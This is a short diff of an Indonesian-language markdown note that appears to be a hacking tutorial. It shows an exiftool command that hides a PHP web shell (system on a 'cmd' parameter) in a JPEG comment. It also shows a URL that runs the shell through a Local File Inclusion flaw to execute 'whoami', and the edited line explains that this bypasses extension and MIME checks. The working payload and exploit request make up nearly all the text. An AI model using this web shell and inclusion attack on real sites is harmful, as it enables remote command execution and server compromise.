@@ -8,7 +8,7 @@ exiftool -Comment='<?php system($_GET["cmd"]); ?>' kucing.jpg -o shell.jpg
 ```
 
 # Eksekusi
-Eksekusi backdoor gambar ke Local File Inclusion :
+Eksekusi backdoor pada file gambar melalui celah Local File Inclusion (LFI). Meskipun terdapat validasi ekstensi dan MIME type, serangan tetap dimungkinkan karena adanya kerentanan LFI :
 
 ```
 https://example.com/index.php?page=uploads/shell.jpg&cmd=whoami
